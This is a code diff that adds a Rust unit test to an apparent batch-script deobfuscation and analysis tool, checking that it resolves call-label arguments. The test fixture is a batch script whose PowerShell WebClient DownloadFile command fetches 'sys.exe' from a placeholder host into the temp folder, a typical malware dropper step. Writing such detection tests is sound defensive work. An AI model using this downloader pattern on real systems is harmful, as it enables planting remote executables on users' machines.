@@ -18576,6 +18576,7 @@ mod if_constant_fold_tests {
 
 #[cfg(test)]
 mod call_label_tests {
+    use crate::traits::Trait;
     use crate::{analyze, Config};
 
     #[test]
@@ -18596,6 +18597,36 @@ mod call_label_tests {
         assert!(
             report.deobfuscated.contains("echo hi there"),
             "quoted call-label arg was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn call_label_setlocal_preserves_positional_args_for_powershell_downloadfile() {
+        let script = br#"set "RAR_URL=https://call-label-download.example/sys.exe"
+set "RAR_DEST=%TEMP%\sys.exe"
+call :DownloadFile "%RAR_URL%" "%RAR_DEST%"
+goto :eof
+:DownloadFile
+setlocal
+set "URL=%~1"
+set "DEST=%~2"
+powershell -Command "Try {(New-Object Net.WebClient).DownloadFile('%URL%','%DEST%')} Catch{}"
+endlocal
+exit /b
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://call-label-download.example/sys.exe"
+                            && dst.as_deref() == Some(r"C:\Users\puncher\AppData\Local\Temp\sys.exe")
+                )
+            }),
+            "call-label PowerShell DownloadFile args were not promoted: {:?}\ndeob:\n{}",
+            report.traits,
             report.deobfuscated
         );
     }
